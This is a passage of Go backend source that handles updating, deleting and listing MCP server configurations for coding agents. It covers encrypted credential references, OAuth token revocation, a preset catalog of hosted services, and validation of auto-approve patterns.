	for key, value := range input.EnvSecrets {
		if value != "" {
			envSecretProvided[strings.TrimSpace(key)] = true
		}
	}
	for _, key := range input.RemovedEnvSecrets {
		key = strings.TrimSpace(key)
		if key == "" {
			continue
		}
		if envProvided[key] || envSecretProvided[key] {
			continue
		}
		delete(merged.Env, key)
	}
	headerProvided := map[string]bool{}
	for key := range input.Headers {
		headerProvided[strings.TrimSpace(key)] = true
	}
	headerSecretProvided := map[string]bool{}
	for key, value := range input.HeaderSecrets {
		if value != "" {
			headerSecretProvided[strings.TrimSpace(key)] = true
		}
	}
	for _, key := range input.RemovedHeaderSecrets {
		key = strings.TrimSpace(key)
		if key == "" {
			continue
		}
		if headerProvided[key] || headerSecretProvided[key] {
			continue
		}
		delete(merged.Headers, key)
	}
	merged.normalize()
	// 作用域从 project 改成 global 时，前端用 projectId:"" 表达清空；空串和「未提供」
	// 在 JSON 里不可区分，但 scope=global 本身就明确要求不带项目。必须在 normalize
	// 之后判断（" Global " 这类字面量只有 normalize 后才等于 global），再去校验。
	if merged.Scope == mcpScopeGlobal {
		merged.ProjectID = ""
	}
	if err := merged.validate(); err != nil {
		writeError(w, http.StatusBadRequest, err)
		return
	}
	// 自动放行白名单与专用 PUT 接口共用同一套形态 + 归属校验。主 PATCH 是前端「保存
	// 整表」的实际入口，不在这里挡就等于专用接口的白名单形同虚设。
	// 只校验**本次新增/修改**的条目：老记录里可能存着修复前写入的 mcp__*，改名时
	// 旧名前缀会被重写；整表保存原样回传（包括重排）不应因此被拦住。
	if merged.Name != current.Name {
		// 改名时白名单必须跟着换前缀：否则旧名模式永久失效，而 UI 整表保存又会带回来。
		merged.AutoApproveTools = rewriteAutoApproveServerPrefix(current.AutoApproveTools, current.Name, merged.Name)
	}
	if input.AutoApproveTools != nil {
		patterns, err := applyAutoApproveEdits(input.AutoApproveTools, current.AutoApproveTools, current.Name, merged.Name)
		if err != nil {
			writeError(w, http.StatusBadRequest, err)
			return
		}
		merged.AutoApproveTools = patterns
	}
	// 地址/传输/作用域/项目变化都会让旧 OAuth 令牌不再适用（URL 可能含 ${PROJECT_DIR}，
	// 解析结果随项目/环境变）。必须在开事务**之前**拿生命周期锁：否则事务已占住
	// SQLite 单连接、再等这把锁，会与持锁写令牌的回调形成死锁。
	endpointChanged := merged.Transport != current.Transport || merged.URL != current.URL ||
		merged.Scope != current.Scope || merged.ProjectID != current.ProjectID
	if endpointChanged {
		s.mcpOAuthLifecycleMu.Lock()
		defer s.mcpOAuthLifecycleMu.Unlock()
		s.cancelMCPServerFlows(serverID)
	}
	tx, err := s.db.BeginTx(ctx, nil)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	defer tx.Rollback()
	if merged.Scope == mcpScopeProject {
		var exists bool
		if err := tx.QueryRowContext(ctx, `select exists(select 1 from projects where id=?)`, merged.ProjectID).Scan(&exists); err != nil || !exists {
			writeError(w, http.StatusBadRequest, errors.New("项目不存在"))
			return
		}
	}
	env, headers, createdSecrets, err := s.buildStoredMaps(ctx, tx, merged.Env, merged.Headers, input.EnvSecrets, input.HeaderSecrets)
	if err != nil {
		writeError(w, http.StatusInternalServerError, errors.New("MCP 凭据无法保存"))
		return
	}
	argsJSON, _ := marshalStringSlice(merged.Args)
	envJSON, _ := marshalStringMap(env)
	headersJSON, _ := marshalStringMap(headers)
	environmentsJSON, _ := marshalStringSlice(merged.Environments)
	agentsJSON, _ := marshalStringSlice(merged.Agents)
	autoApproveJSON, _ := marshalStringSlice(merged.AutoApproveTools)
	displayName, description := "", ""
	if merged.DisplayName != nil {
		displayName = *merged.DisplayName
	}
	if merged.Description != nil {
		description = *merged.Description
	}
	if displayName == "" {
		displayName = merged.Name
	}
	now := time.Now().UTC()
	result, execErr := tx.ExecContext(ctx, `update mcp_servers set name=?,display_name=?,description=?,transport=?,command=?,args_json=?,env_json=?,cwd=?,url=?,headers_json=?,scope=?,project_id=?,environments=?,agents=?,enabled=?,auto_approve_tools=?,startup_timeout_sec=?,tool_timeout_sec=?,updated_at=? where id=?`,
		merged.Name, displayName, description, merged.Transport, merged.Command, argsJSON, envJSON, merged.Cwd, merged.URL, headersJSON,
		merged.Scope, merged.ProjectID, environmentsJSON, agentsJSON, merged.Enabled, autoApproveJSON,
		merged.StartupTimeoutSec, merged.ToolTimeoutSec, now, serverID)
	if execErr != nil {
		for _, id := range createdSecrets {
			_ = s.profileSecrets.Revoke(tx, ctx, id)
		}
		if isUniqueConstraint(execErr) {
			writeError(w, http.StatusConflict, errors.New("同名 MCP server 已存在（作用域内名称需唯一）"))
			return
		}
		writeError(w, http.StatusBadRequest, execErr)
		return
	}
	if affected, affectedErr := result.RowsAffected(); affectedErr == nil && affected == 0 {
		// 后台 TTL 清理可能刚删掉这条 oauth-pending 记录；不要把零值对象当成功返回。
		writeError(w, http.StatusNotFound, errors.New("MCP server not found"))
		return
	}
	// 作用域/归属变了，旧的项目覆盖行不再有明确语义（改全局后它会让该 server 在旧项目
	// 继续关闭；移到别的项目后它对任何视图都不可见）。一并清掉。
	if merged.Scope != current.Scope || merged.ProjectID != current.ProjectID {
		if _, err := tx.ExecContext(ctx, `delete from mcp_project_bindings where server_id=?`, serverID); err != nil {
			writeError(w, http.StatusInternalServerError, err)
			return
		}
	}
	// 令牌行与地址变更在同一事务里删除：提交后旧 host 的 Bearer 不可能再被注入新 URL。
	var oauthTokenRefs []string
	if endpointChanged {
		row, loadErr := scanMCPOAuthToken(tx.QueryRowContext(ctx,
			`select `+mcpOAuthTokenColumns+` from mcp_oauth_tokens where server_id=?`, serverID))
		if loadErr == nil {
			if _, err := tx.ExecContext(ctx, `delete from mcp_oauth_tokens where server_id=?`, serverID); err != nil {
				for _, id := range createdSecrets {
					_ = s.profileSecrets.Revoke(tx, ctx, id)
				}
				writeError(w, http.StatusInternalServerError, err)
				return
			}
			oauthTokenRefs = []string{row.AccessTokenRef, row.RefreshTokenRef, row.ClientSecretRef}
		} else if !errors.Is(loadErr, sql.ErrNoRows) {
			for _, id := range createdSecrets {
				_ = s.profileSecrets.Revoke(tx, ctx, id)
			}
			writeError(w, http.StatusInternalServerError, loadErr)
			return
		}
	}
	if err := tx.Commit(); err != nil {
		// 事务没提交成功：本次刚创建的密文引用必须回收，否则永远没人引用它们。
		for _, id := range createdSecrets {
			_ = s.profileSecrets.Revoke(s.db, ctx, id)
		}
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	// 被覆盖或被移除的旧密钥引用及时吊销，避免残留密文。失败不改变已提交的更新，
	// 但必须可见：静默失败会留下永远没人引用的可用密文。用后台超时，避免请求 ctx
	// 已取消时一条都回收不了。
	revokeCtx, revokeCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer revokeCancel()
	for _, ref := range collectSecretRefs(current.envRaw, current.headersRaw) {
		if !containsString(collectSecretRefs(env, headers), ref) {
			if err := s.profileSecrets.Revoke(s.db, revokeCtx, ref); err != nil {
				log.Printf("[mcp] revoke replaced secret %s: %v", ref, err)
			}
		}
	}
	// 地址/传输/作用域变了：令牌行已在事务里删除，现在回收它引用的密文。
	for _, ref := range oauthTokenRefs {
		if strings.TrimSpace(ref) == "" {
			continue
		}
		if err := s.profileSecrets.Revoke(s.db, revokeCtx, ref); err != nil {
			log.Printf("[mcp] revoke oauth credential after endpoint change: %v", err)
		}
	}
	stored, _ := s.fetchMCPServer(ctx, serverID)
	writeJSON(w, http.StatusOK, stored)
}

func (s *Server) deleteMCPServer(w http.ResponseWriter, r *http.Request) {
	serverID := chi.URLParam(r, "serverID")
	ctx := r.Context()
	if _, err := s.fetchStoredMCPServer(ctx, serverID); errors.Is(err, sql.ErrNoRows) {
		writeError(w, http.StatusNotFound, errors.New("MCP server not found"))
		return
	} else if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	if err := s.removeMCPServer(ctx, serverID); err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *Server) removeMCPServer(ctx context.Context, serverID string) error {
	s.mcpWriteMu.Lock()
	defer s.mcpWriteMu.Unlock()
	s.mcpOAuthLifecycleMu.Lock()
	defer s.mcpOAuthLifecycleMu.Unlock()
	return s.removeMCPServerLocked(ctx, serverID)
}

func (s *Server) removeMCPServerLocked(ctx context.Context, serverID string) error {
	s.cancelMCPServerFlows(serverID)
	current, err := s.fetchStoredMCPServer(ctx, serverID)
	if errors.Is(err, sql.ErrNoRows) {
		return nil
	}
	if err != nil {
		return err
	}
	// 先吊销 OAuth 令牌、再删行：吊销失败时 500 中止，什么都没发生、可重试；
	// 反过来（先删行）失败会让前端拿着「删除失败」的报错去找一条已经不存在的记录。
	// ErrNoRows（本来就没有令牌）不算错。
	if err := s.revokeMCPOAuthToken(ctx, serverID); err != nil {
		return err
	}
	if _, err := s.db.ExecContext(ctx, `delete from mcp_servers where id=?`, serverID); err != nil {
		return err
	}
	for _, ref := range collectSecretRefs(current.envRaw, current.headersRaw) {
		if err := s.profileSecrets.Revoke(s.db, ctx, ref); err != nil {
			log.Printf("[mcp] revoke secret %s on delete: %v", ref, err)
		}
	}
	return nil
}

// storedMCPServer 是内部使用的完整行（env/headers 保留原始 sec_ 引用）。
type storedMCPServer struct {
	mcpServer
	envRaw     map[string]string
	headersRaw map[string]string
}

func (s *Server) fetchStoredMCPServer(ctx context.Context, serverID string) (storedMCPServer, error) {
	var out storedMCPServer
	var argsJSON, envJSON, headersJSON, environmentsJSON, agentsJSON, autoApproveJSON string
	err := s.db.QueryRowContext(ctx, `select `+mcpServerColumns+` from mcp_servers where id=?`, serverID).Scan(
		&out.ID, &out.Name, &out.DisplayName, &out.Description, &out.Transport,
		&out.Command, &argsJSON, &envJSON, &out.Cwd,
		&out.URL, &headersJSON,
		&out.Scope, &out.ProjectID, &environmentsJSON, &agentsJSON,
		&out.Enabled, &autoApproveJSON, &out.StartupTimeoutSec, &out.ToolTimeoutSec,
		&out.Source, &out.CreatedAt, &out.UpdatedAt,
	)
	if err != nil {
		return storedMCPServer{}, err
	}
	out.Args = unmarshalStringSlice(argsJSON)
	out.Environments = unmarshalStringSlice(environmentsJSON)
	out.Agents = unmarshalStringSlice(agentsJSON)
	out.AutoApproveTools = unmarshalStringSlice(autoApproveJSON)
	out.envRaw = unmarshalStringMap(envJSON)
	out.headersRaw = unmarshalStringMap(headersJSON)
	out.Env, out.EnvSecretKeys = splitSecretKeys(out.envRaw)
	out.Headers, out.HeaderSecretKeys = splitSecretKeys(out.headersRaw)
	return out, nil
}

// fetchMCPServer 返回读接口形态（密钥键名以列表给出，值不回显）。
func (s *Server) fetchMCPServer(ctx context.Context, serverID string) (mcpServer, error) {
	stored, err := s.fetchStoredMCPServer(ctx, serverID)
	if err != nil {
		return mcpServer{}, err
	}
	return stored.mcpServer, nil
}

func collectSecretRefs(maps ...map[string]string) []string {
	refs := []string{}
	for _, m := range maps {
		for _, value := range m {
			if strings.HasPrefix(value, mcpSecretRefPrefix) {
				refs = append(refs, value)
			}
		}
	}
	return refs
}

// projectMCPTokenRefs 是删除项目时需要回收的 OAuth 密文引用（删行之前必须先取出来）。
type projectMCPTokenRefs struct {
	ServerID        string
	AccessTokenRef  string
	RefreshTokenRef string
	ClientSecretRef string
}

// projectMCPRowsForDeletion 取出项目级 MCP 定义及其 OAuth 令牌引用。
//
// MCP 各表都没有指向 projects 的外键（见各 migrate 函数），删除项目时必须显式清理：
// 否则项目级 server、项目开关、`.mcp.json` 放行记录与 OAuth 令牌会变成孤儿，凭据密文
// 再没有任何引用、永远不会被回收。
func (s *Server) projectMCPRowsForDeletion(ctx context.Context, projectID string) ([]storedMCPServer, []projectMCPTokenRefs, error) {
	servers := []storedMCPServer{}
	rows, err := s.db.QueryContext(ctx, `select `+mcpServerColumns+` from mcp_servers where scope=? and project_id=?`, mcpScopeProject, projectID)
	if err != nil {
		return nil, nil, err
	}
	for rows.Next() {
		stored, scanErr := scanStoredMCPServer(rows)
		if scanErr != nil {
			rows.Close()
			return nil, nil, scanErr
		}
		servers = append(servers, stored)
	}
	err = rows.Err()
	// SQLite 单连接：必须在下一个查询前关闭 rows。
	if closeErr := rows.Close(); err == nil {
		err = closeErr
	}
	if err != nil {
		return nil, nil, err
	}

	tokens := []projectMCPTokenRefs{}
	tokenRows, err := s.db.QueryContext(ctx, `select server_id, access_token_ref, refresh_token_ref, client_secret_ref
		from mcp_oauth_tokens where server_id in (select id from mcp_servers where scope=? and project_id=?)`,
		mcpScopeProject, projectID)
	if err != nil {
		return nil, nil, err
	}
	for tokenRows.Next() {
		var row projectMCPTokenRefs
		if scanErr := tokenRows.Scan(&row.ServerID, &row.AccessTokenRef, &row.RefreshTokenRef, &row.ClientSecretRef); scanErr != nil {
			tokenRows.Close()
			return nil, nil, scanErr
		}
		tokens = append(tokens, row)
	}
	err = tokenRows.Err()
	if closeErr := tokenRows.Close(); err == nil {
		err = closeErr
	}
	return servers, tokens, err
}

// revokeProjectMCPCredential 在项目删除后回收密文。best-effort：项目行已经去掉，
// 失败只能记日志（已无任何界面入口能重试到这些引用）。调用方统一传一个后台超时
// 上下文，避免每条引用各自等 5 秒。
func (s *Server) revokeProjectMCPCredential(ctx context.Context, ref string) {
	if strings.TrimSpace(ref) == "" {
		return
	}
	if err := s.profileSecrets.Revoke(s.db, ctx, ref); err != nil {
		log.Printf("[mcp] revoke secret %s after project delete: %v", ref, err)
	}
}

func containsString(list []string, want string) bool {
	for _, item := range list {
		if item == want {
			return true
		}
	}
	return false
}

func isUniqueConstraint(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "unique constraint") || strings.Contains(msg, "constraint failed")
}

// mcpPresetCredential 描述一条模板需要用户自己提供的凭据。
//
// Target 决定它落在表单的哪个字段：env（stdio 的环境变量）或 header（http 的请求头）。
// 模板只做声明 —— 真值仍由用户在表单里以明文填写、保存时自动加密为 sec_ 引用。
type mcpPresetCredential struct {
	Key         string `json:"key"`
	Target      string `json:"target"`
	Label       string `json:"label"`
	Description string `json:"description"`
	// ValuePrefix 是填值时要替用户补上的前缀（如 "Bearer "）。
	//
	// 有它，用户在向导里只需要粘 token 本身，不必知道 Authorization 头必须带 Bearer ——
	// 「不懂也能用」的一部分就是**别让用户去记格式**。空表示直接使用用户输入。
	ValuePrefix string `json:"valuePrefix,omitempty"`
	// DocsURL 是申请该凭据的地址（如 GitHub 的 token 设置页）。
	DocsURL string `json:"docsUrl,omitempty"`
}

// 凭据落点。前端据此决定把提示写进「环境变量」还是「请求头」。
const (
	mcpPresetCredentialEnv    = "env"
	mcpPresetCredentialHeader = "header"
)

// mcpPresetRequirement 描述一条模板在目标环境需要的可执行程序。
//
// 这里只声明「需要什么」，是否真的存在由 POST /api/mcp/runtime-check 在目标环境实测 ——
// 目的是把「保存 → 测试 → 失败 → 回改」的返工提前到保存之前。
type mcpPresetRequirement struct {
	Command string `json:"command"`
	Label   string `json:"label"`
	Hint    string `json:"hint,omitempty"`
}

// mcpPreset 是内置服务目录（只读清单，供前端「一键连接」使用）。
//
// **目录的筛选标准（2026-09-15 定，比字段更要紧）**：面向「不懂 MCP 的用户」，进目录的服务
// 必须满足 ①用户认得这个服务名 ②只需要「点一次浏览器授权」或「填一个凭据」就能用。
// 一条只写启动命令、要用户自己去别处查依赖与凭据的条目，价值只是省几次敲键盘 —— 不进目录。
type mcpPreset struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	DisplayName string `json:"displayName"`
	// Description 与 Summary 是同一句话：前者被「手动配置（高级）」表单预填，后者给目录卡片用。
	// 两个字段并存只是为了不改动既有前端字段名，不要把两处写成不同文案 —— 那会让用户在两处
	// 看到对同一个服务的两种说法。
	Description string `json:"description"`
	// Summary 是给不懂 MCP 的用户看的一句话：连上之后能干什么。
	Summary string `json:"summary"`
	// Category 用于目录分组；顺序由本文件决定，前端不本地重排。
	Category string `json:"category"`
	// Icon 是前端图标键；前端只实现固定几个键，未知键退化为通用图标。
	Icon string `json:"icon"`

	Transport string   `json:"transport"`
	Command   string   `json:"command,omitempty"`
	Args      []string `json:"args,omitempty"`
	URL       string   `json:"url,omitempty"`

	Environments []string `json:"environments"`

	Requires    []mcpPresetRequirement `json:"requires,omitempty"`
	Credentials []mcpPresetCredential  `json:"credentials,omitempty"`
	// OAuth 表示该服务支持浏览器授权（用户只需点一次，不用自己去申请 Token）。
	// 为真且 Credentials 为空时，就是真正的「一键连接」。
	OAuth bool `json:"oauth,omitempty"`

	DocsURL string `json:"docsUrl,omitempty"`
	// Note 用于说明该条目与上游版本/废弃情况相关的事项，在表单里原样展示。
	Note string `json:"note,omitempty"`
	// Mode 决定目录卡片是否可以直接进入连接向导。manual 只展示官方接入文档，
	// 避免把尚未确认的第三方 MCP 地址伪装成可用的一键连接。
	Mode string `json:"mode"`
}

// 目录分组。
//
// 「本机运行」分组（filesystem / playwright / fetch / memory / context7 / github-local）
// 已暂时下线（2026-09-24）：先只做远程托管形态。mcpLocalPreset 与运行时依赖声明随之一并
// 移除；恢复时按 docs/34 §26 记录的形状重建（stdio + requires 诚实声明 + 凭据落点）。
const (
	mcpPresetCategoryCommon = "常用服务"
	mcpPresetModeConnect    = "connect"
)

// mcpGitHubRemoteURL 是 GitHub 官方托管的远程 MCP server。
//
// 原来的 github 模板指向 `@modelcontextprotocol/server-github`，该 npm 包 2025-04 已归档弃用
// （官方开发迁至 github/github-mcp-server，且旧包硬 pin SDK 1.0.1、协议协商停在 2024-11-05）。
// 远程托管形态是最省事的一种：环境无关，且 PAT（Authorization 头）与 OAuth 2.1 都支持。
const mcpGitHubRemoteURL = "https://api.githubcopilot.com/mcp/"

// mcpGitHubDocsURL 是官方仓库，两种形态都指向这里。
const mcpGitHubDocsURL = "https://github.com/github/github-mcp-server"

// mcpPresetEnvironmentsAll 是所有目录条目共用的适用环境。
//
// 远程托管形态天然环境无关；本地形态的实际可用性由「运行时依赖检查」在目标环境实测回答，
// 不靠这里的静态声明 —— 声明成子集只会让用户白白少一个可选项。
func mcpPresetEnvironmentsAll() []string {
	return []string{string(agentTargetEnvWindows), string(agentTargetEnvWSL), string(agentTargetEnvRemote)}
}

// mcpRemotePreset 造一条「远程托管」目录条目。URL 均取自各服务官方文档。
func mcpRemotePreset(id, name, display, summary, icon, rawURL string, oauth bool, credentials []mcpPresetCredential, docsURL string) mcpPreset {
	return mcpPreset{
		ID: id, Name: name, DisplayName: display,
		Description: summary, Summary: summary,
		Category: mcpPresetCategoryCommon, Icon: icon,
		Transport: mcpTransportHTTP, URL: rawURL,
		Environments: mcpPresetEnvironmentsAll(),
		OAuth:        oauth, Credentials: credentials, DocsURL: docsURL, Mode: mcpPresetModeConnect,
	}
}

func mcpPresetCatalog() []mcpPreset {
	githubToken := []mcpPresetCredential{{
		Key: "Authorization", Target: mcpPresetCredentialHeader, Label: "GitHub Personal Access Token",
		ValuePrefix: "Bearer ",
		Description: "不想授权 OAuth 时也可以填一个 Token。推荐最小权限 scope：repo、read:org。",
		DocsURL:     "https://github.com/settings/tokens",
	}}

	// 「常用服务」：远程托管 + OAuth，用户只需点一次浏览器授权（或填一个凭据）。
	// 2026-09-24 起「本机运行」分组暂时下线（先只做远程托管），见目录分组处的注释。
	common := []mcpPreset{
		mcpRemotePreset("notion", "notion", "Notion", "读写你的 Notion 页面与数据库", "docs",
			"https://mcp.notion.com/mcp", true, nil, "https://developers.notion.com/docs/mcp"),
		mcpRemotePreset("github", "github", "GitHub", "查看与修改代码仓库、Issue、PR", "code",
			mcpGitHubRemoteURL, true, githubToken, mcpGitHubDocsURL),
		mcpRemotePreset("stripe", "stripe", "Stripe", "查询支付、订阅与客户", "pay",
			"https://mcp.stripe.com", true, []mcpPresetCredential{{
				Key: "Authorization", Target: mcpPresetCredentialHeader, Label: "Stripe Restricted Key",
				ValuePrefix: "Bearer ",
				Description: "不想授权 OAuth 时也可以填受限密钥。",
				DocsURL:     "https://dashboard.stripe.com/apikeys",
			}}, "https://docs.stripe.com/mcp"),
	}

	common = append(common, mcpRemotePreset("aliyun", "aliyun", "阿里云", "查询阿里云资源、配额、监控和审计信息", "cloud", "https://api.aliyun.com/mcp", true, nil, "https://help.aliyun.com/zh/openapi/user-guide/openapi-mcp-server-guide"))
	return common
}

func (s *Server) listMCPPresets(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, mcpPresetCatalog())
}

// projectMCPEntry 是项目视角下一条实际生效的 MCP server。
type projectMCPEntry struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	DisplayName string `json:"displayName"`
	Transport   string `json:"transport"`
	Scope       string `json:"scope"`
	Enabled     bool   `json:"enabled"`
	// Source 取值：global | project。
	Origin string `json:"origin"`
}

type projectMCPView struct {
	ProjectID    string                  `json:"projectId"`
	Environment  string                  `json:"environment"`
	AgentID      string                  `json:"agentId"`
	StrictMode   bool                    `json:"strictMode"`
	AllowMcpJson bool                    `json:"allowMcpJson"`
	Effective    []projectMCPEntry       `json:"effective"`
	Bindings     []projectMCPBindingView `json:"bindings"`
	// McpJSONServers 是项目根 `.mcp.json` 里声明的 server 名；仅在放行后才会被加载。
	McpJSONServers []string `json:"mcpJsonServers"`
	Warnings       []string `json:"warnings"`
}

func (s *Server) getProjectMCP(w http.ResponseWriter, r *http.Request) {
	projectID := chi.URLParam(r, "projectID")
	project, err := s.getProjectByID(r.Context(), projectID)
	if errors.Is(err, sql.ErrNoRows) {
		writeError(w, http.StatusNotFound, errors.New("project not found"))
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	target := s.resolveAgentTargetEnv(project.RunnerID, project.Path)
	// 生效列表与注入一样是「按 Agent」的：以前固定按 claude-code 算，会话用 Codex/
	// OpenCode 时界面展示的与实际注入的可以完全不同。允许显式指定，默认 claude-code。
	agentID := strings.TrimSpace(r.URL.Query().Get("agentId"))
	if agentID == "" {
		agentID = "claude-code"
	}
	if !validProfileAgent(agentID) {
		writeError(w, http.StatusBadRequest, errors.New("未知的 Agent"))
		return
	}
	allowMcpJson := s.projectMCPAllowMcpJson(r.Context(), projectID)
	view := projectMCPView{
		ProjectID:      projectID,
		Environment:    string(target),
		AgentID:        agentID,
		StrictMode:     !allowMcpJson,
		AllowMcpJson:   allowMcpJson,
		Effective:      []projectMCPEntry{},
		Bindings:       []projectMCPBindingView{},
		McpJSONServers: []string{},
		Warnings:       []string{},
	}
	selected, err := s.selectMCPServers(r.Context(), projectID, agentID, target)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	for _, server := range selected {
		view.Effective = append(view.Effective, projectMCPEntry{
			ID:          server.ID,
			Name:        server.Name,
			DisplayName: server.DisplayName,
			Transport:   server.Transport,
			Scope:       server.Scope,
			Enabled:     server.Enabled,
			Origin:      server.Scope,
		})
	}
	bindings, err := s.listProjectMCPBindings(r.Context(), projectID)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	view.Bindings = bindings
	view.McpJSONServers = projectMcpJSONServerNames(project.Path)
	// nil 切片会序列化成 null，前端按 string[] 取 .length 时直接抛错（项目根没有
	// .mcp.json 是常态）。这里统一回落到空数组。
	if view.McpJSONServers == nil {
		view.McpJSONServers = []string{}
	}
	if allowMcpJson {
		if len(view.McpJSONServers) == 0 {
			view.Warnings = append(view.Warnings,
				"已放行项目 .mcp.json，但项目根目录没有声明任何 MCP server。放行后 Claude 也会加载你在终端里配置的 MCP。",
			)
		} else {
			view.Warnings = append(view.Warnings,
				"已放行项目 .mcp.json："+strings.Join(view.McpJSONServers, "、")+"。这些 server 会在任务启动时被自动拉起（不弹审批），请确认其来源可信。",
			)
		}
	} else {
		view.Warnings = append(view.Warnings,
			"默认启用严格模式（--strict-mcp-config）：项目根目录的 .mcp.json 以及你在终端里配置的 MCP 不会被加载。",
		)
	}
	if target == agentTargetEnvRemote {
		view.Warnings = append(view.Warnings, "远端环境按远端 Claude Code 是否支持 --mcp-config 决定是否注入；不支持时会跳过并在任务日志中提示。版本低于 2.1.246 时仍启用严格模式，但会在日志给出可见警告。")
	}
	writeJSON(w, http.StatusOK, view)
}

// selectMCPServers 解析一条项目在指定 Agent + 目标环境下实际生效的 MCP 定义。
// project 作用域覆盖同名 global 定义。
func (s *Server) selectMCPServers(ctx context.Context, projectID, agentID string, target agentTargetEnv) ([]storedMCPServer, error) {
	// 注意：SQLite 以 SetMaxOpenConns(1) 运行，必须在打开 rows 之前把绑定查完，
	// 否则第二个查询会等一个被未关闭 rows 占用的连接而死锁。
	disabled, err := s.disabledMCPServerIDs(ctx, projectID)
	if err != nil {
		return nil, err
	}
	rows, err := s.db.QueryContext(ctx, `select `+mcpServerColumns+` from mcp_servers
		where enabled=1 and (scope='global' or (scope='project' and project_id=?))`, projectID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	byName := map[string]storedMCPServer{}
	order := []string{}
	for rows.Next() {
		stored, err := scanStoredMCPServer(rows)
		if err != nil {
			return nil, err
		}
		if !containsString(stored.Environments, string(target)) || !containsString(stored.Agents, agentID) {
			continue
		}
		if disabled[stored.ID] {
			continue
		}
		if _, exists := byName[stored.Name]; !exists {
			order = append(order, stored.Name)
		}
		// project 作用域优先级更高，后者覆盖前者。
		if existing, ok := byName[stored.Name]; !ok || (stored.Scope == mcpScopeProject && existing.Scope != mcpScopeProject) {
			byName[stored.Name] = stored
		}
	}
	if err := rows.Err(); err != nil {
		return nil, err
	}
	sort.Strings(order)
	out := make([]storedMCPServer, 0, len(order))
	for _, name := range order {
		out = append(out, byName[name])
	}
	return out, nil
}

func scanStoredMCPServer(rows *sql.Rows) (storedMCPServer, error) {
	var out storedMCPServer
	var argsJSON, envJSON, headersJSON, environmentsJSON, agentsJSON, autoApproveJSON string
	if err := rows.Scan(
		&out.ID, &out.Name, &out.DisplayName, &out.Description, &out.Transport,
		&out.Command, &argsJSON, &envJSON, &out.Cwd,
		&out.URL, &headersJSON,
		&out.Scope, &out.ProjectID, &environmentsJSON, &agentsJSON,
		&out.Enabled, &autoApproveJSON, &out.StartupTimeoutSec, &out.ToolTimeoutSec,
		&out.Source, &out.CreatedAt, &out.UpdatedAt,
	); err != nil {
		return storedMCPServer{}, err
	}
	out.Args = unmarshalStringSlice(argsJSON)
	out.Environments = unmarshalStringSlice(environmentsJSON)
	out.Agents = unmarshalStringSlice(agentsJSON)
	out.AutoApproveTools = unmarshalStringSlice(autoApproveJSON)
	out.envRaw = unmarshalStringMap(envJSON)
	out.headersRaw = unmarshalStringMap(headersJSON)
	out.Env, out.EnvSecretKeys = splitSecretKeys(out.envRaw)
	out.Headers, out.HeaderSecretKeys = splitSecretKeys(out.headersRaw)
	return out, nil
}

// mcpRuntimeDir 返回运行时临时配置目录（位于私有数据目录下，随 data/* 被 git 忽略）。
// 目录解析沿用 profile-master.key 的逻辑（app.go New）：优先 DataDir，为空时回退数据库目录。
func (s *Server) mcpRuntimeDir() string {
	base := s.config.DataDir
	if base == "" {
		base = filepath.Dir(s.config.DatabasePath)
	}
	if base == "" {
		base = "."
	}
	return filepath.Join(base, mcpRuntimeDirName)
}

// cleanupStaleMCPRuntimeFiles 删除超过 TTL 的残留运行时配置（异常退出兜底）。
func (s *Server) cleanupStaleMCPRuntimeFiles() {
	dir := s.mcpRuntimeDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	cutoff := time.Now().Add(-mcpStaleFileTTL)
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			_ = os.Remove(filepath.Join(dir, entry.Name()))
		}
	}
}

// writeMCPRuntimeFile 把配置内容写入运行时目录并返回 Windows 形态的绝对路径。
func (s *Server) writeMCPRuntimeFile(runKey, content string) (string, func(), error) {
	dir := s.mcpRuntimeDir()
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return "", func() {}, fmt.Errorf("create mcp runtime dir: %w", err)
	}
	path := filepath.Join(dir, sanitizeMCPRunKey(runKey)+".json")
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		return "", func() {}, fmt.Errorf("write mcp config: %w", err)
	}
	cleanup := func() { _ = os.Remove(path) }
	return path, cleanup, nil
}

// sanitizeMCPRunKey 把 run/session 标识规约为安全的文件名片段。
func sanitizeMCPRunKey(key string) string {
	var b strings.Builder
	for _, r := range key {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteByte('_')
		}
	}
	out := b.String()
	if out == "" {
		out = uuid.NewString()
	}
	return out
}

// ---------------------------------------------------------------------------
// 工具级免审批白名单（P2）
// ---------------------------------------------------------------------------

// mcpAutoApprovePattern 限定自动放行模式的形态：
//   - Bash 或 Bash(<pattern>)：与既有命令白名单一致；
//   - mcp__<server>__<tool|*>：MCP 工具级白名单（Claude Code 的 allow 语法要求 server
//     段是字面量，见 docs/34 §8.4）。
//
// 不接受 mcp__* 这类无锚点写法：它会让任何 server 的任何工具静默执行，与「工具级」的
// 语义相悖。需要全量放行某个 server 时用 mcp__<server>__*。
var mcpAutoApprovePattern = regexp.MustCompile(`^(Bash(\(.+\))?|mcp__[A-Za-z0-9_-]+__[A-Za-z0-9_*.-]+)$`)

// normalizeMCPAutoApprovePatterns 校验并去重自动放行模式。
func normalizeMCPAutoApprovePatterns(values []string) ([]string, error) {
	out := []string{}
	seen := map[string]bool{}
	for _, value := range values {
		value = strings.TrimSpace(value)
		if value == "" || seen[value] {
			continue
		}
		if !mcpAutoApprovePattern.MatchString(value) {
			return nil, fmt.Errorf("不支持的自动放行模式 %q：应为 Bash、Bash(前缀*) 或 mcp__<server>__<tool|*>", value)
		}
